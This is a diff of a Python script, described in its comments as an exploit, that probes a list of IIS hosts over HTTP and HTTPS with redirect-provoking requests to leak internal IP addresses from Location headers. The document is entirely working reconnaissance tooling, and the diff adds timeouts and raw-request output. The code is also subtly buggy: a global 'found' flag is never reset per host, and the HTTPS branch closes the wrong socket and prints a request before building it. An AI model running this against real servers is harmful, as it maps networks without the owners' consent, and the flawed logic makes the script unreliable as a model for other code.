@@ -2,14 +2,14 @@ import re
 import socket
 import ssl
 from colorama import Fore, Style, Back
+from time import sleep
 
 # This exploit is inspired by metasaploit module "Microsoft IIS HTTP Internal IP Disclosure"
 # But we try too cover more possible situiations
 # Hosts list are in a format like this
 # <prorocol>://<domain or IP address>:<port>
-# For more info read the example-hosts.txt
+# For more info read the example_hosts.txt
 
-# Input file
 
 hosts_file = "path to example_hosts.txt"
 hosts_list = open(hosts_file, 'r').readlines()
@@ -19,6 +19,8 @@ protocol = ''
 server_name = ''
 server_ip = ''
 server_port = ''
+found = False
+
 
 # We need some 30* redirection to find the internal IP !
 # These urls may cause a redirect
@@ -49,8 +51,9 @@ http_methods = [
 ]
 
 
-
 def enumerate_internal_IP_addresses():
+
+    global found
 
     for host in hosts_list:
         
@@ -64,8 +67,6 @@ def enumerate_internal_IP_addresses():
         server_name = host[host.find("://") + 3 : host.find(":", 6)]
         server_port = int(host[host.find(":", 7) + 1 : ])
 
-        # choose the url
-        # looping through urls next time :)
         url = possible_iis_redirect_urls[2]
         regex_compiler = re.compile(r"^\d+\.\d+\.\d+\.\d+")
 
@@ -97,6 +98,7 @@ def enumerate_internal_IP_addresses():
 
                 try:
                     sock_http = socket.create_connection((server_name, server_port))
+                    sock_http.settimeout(10)
                 except:
                     print(Back.LIGHTRED_EX)
                     print("    [-] Error on connecting to host {}:{}".format(server_name, server_port))
@@ -104,9 +106,8 @@ def enumerate_internal_IP_addresses():
                     sock_http.close()
                     break
                 
-                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying url {} with method {} ".format(url, method) )
+                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying request {}".format(request.encode()) )
 
-                # request = "{} {} HTTP/1.0\r\nConnection: close\r\n\r\n".format(method, url)
                 sock_http.sendall(request.encode())
 
                 response = ''
@@ -116,20 +117,15 @@ def enumerate_internal_IP_addresses():
                 if response != '' and response.find("Location") > -1 and response.find("http") > -1:
                     
                     tmp_index_1 = response.find("http")
-                    # flag = 0
-                    # if tmp_index_1 == -1:
-                    #     tmp_index_1 = response.find("http://")
-                    #     flag -= 1
-                    
                     tmp_index_2 = response.find("\n", tmp_index_1)
 
                     location = response[ tmp_index_1 : tmp_index_2 ]
-
-                    if regex_compiler.match(location[location.find("://") : location.find("/", location.find("://"))]) == None:
-                        print(Fore.LIGHTYELLOW_EX)
-                        print("    [!] Redirection found with location header but does not contain IP address !!\r")
-                        print("    [!] Location header response : {}\r".format(location))
-                        print(Style.RESET_ALL)
+                    
+                    if regex_compiler.match(location[location.find("://") + 3: location.find("/", location.find("://") + 3)]) == None:
+                        # print(Fore.LIGHTYELLOW_EX)
+                        # print("    [!] Redirection found with location header but does not contain IP address !!", end="\r")
+                        # print("    [!] Location header response : " + location + Style.RESET_ALL, end="\r\r\r")
+                        # sleep(1)
                         sock_http.close()
                         continue
                     
@@ -138,15 +134,21 @@ def enumerate_internal_IP_addresses():
                     print(Fore.LIGHTGREEN_EX + "    [+]  Internal IP address redirection : " + Fore.LIGHTGREEN_EX + location)
                     print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " HTTP method : {}".format(method))
                     print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Redirect URL : {}".format(url))
+                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Raw request : {}".format(request.encode()))
+
+                    sleep(1)
+                    found = True
+
                     sock_http.close()
-                    # print("    [+] Raw request : {}".format(request))
+                    
                     break
-                else:
-                    print(Fore.LIGHTRED_EX + "    [-] No Internal IP address found for {}:{} with HTTP method {}".format(server_name, server_port, method) + Style.RESET_ALL)
                     
                 sock_http.close()
 
-            print()
+            if not found:
+                print(Fore.LIGHTRED_EX + "\n    [-] No Internal IP address found for {}:{} with all possible methods and urls\n".format(server_name, server_port) + Style.RESET_ALL)                
+
+            print("\n**************************************************************************************\n")
 
                     
 
@@ -163,7 +165,7 @@ def enumerate_internal_IP_addresses():
                     sock_https = socket.create_connection((server_name, server_port))
                     context = ssl.SSLContext()
                     ssock = context.wrap_socket(sock_https, server_hostname=server_name)
-                    # ssock.settimeout(10)
+                    ssock.settimeout(10)
                 except:
                     print(Back.LIGHTRED_EX)
                     print("    [-] Error on connecting to host {}:{}".format(server_name, server_port))
@@ -172,7 +174,7 @@ def enumerate_internal_IP_addresses():
                     ssock.close()
                     break
 
-                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying url {} with method {} ".format(url, method) )
+                print(Fore.LIGHTCYAN_EX + "    [*]" + Style.RESET_ALL +  " Trying request {}".format(request.encode()) )
                 
                 request = "{} {} HTTP/1.0\r\nConnection: close\r\n\r\n".format(method, url)
                 ssock.sendall(request.encode())
@@ -188,10 +190,10 @@ def enumerate_internal_IP_addresses():
 
                     location = response[ tmp_index_1: tmp_index_2 ]
                     if regex_compiler.match(location[location.find("://") + 3: location.find("/", location.find("://") + 3)]) == None:
-                        print(Fore.LIGHTYELLOW_EX)
-                        print("    [!] Redirection found with location header but does not contain IP address !!")
-                        print("    [!] Location header response : {}".format(location))
-                        print(Style.RESET_ALL)
+                        # print(Fore.LIGHTYELLOW_EX)
+                        # print("    [!] Redirection found with location header but does not contain IP address !!")
+                        # print("    [!] Location header response : {}".format(location) + Style.RESET_ALL, end="\r")
+                        # sleep(1)
                         sock_http.close()
                         ssock.close()
                         continue
@@ -201,18 +203,22 @@ def enumerate_internal_IP_addresses():
                     print(Fore.LIGHTGREEN_EX + "    [+]  Internal IP address redirection : " + Fore.LIGHTGREEN_EX + location)
                     print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " HTTP method : {}".format(method))
                     print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Redirect URL : {}".format(url))
-                    # print("    [+] Raw request : {}".format(request))
+                    print(Fore.LIGHTGREEN_EX + "    [+] " + Style.RESET_ALL + " Raw request : {}".format(request.encode()))
+
+                    sleep(1)
+                    found = True
 
                     sock_https.close()
                     ssock.close()
                     break
-                else:
-                   print(Fore.LIGHTRED_EX + "    [-] No Internal IP address found for {}:{} with HTTP method {}\n".format(server_name, server_port, method) + Style.RESET_ALL)                
                 
                 sock_https.close()
                 ssock.close()
 
-        print("\n**************************************************************************************\n")
+            if not found:
+                print(Fore.LIGHTRED_EX + "\n    [-] No Internal IP address found for {}:{} with all possible methods and urls\n".format(server_name, server_port) + Style.RESET_ALL)                
+
+            print("\n**************************************************************************************\n")
 
             
 if __name__ == "__main__":
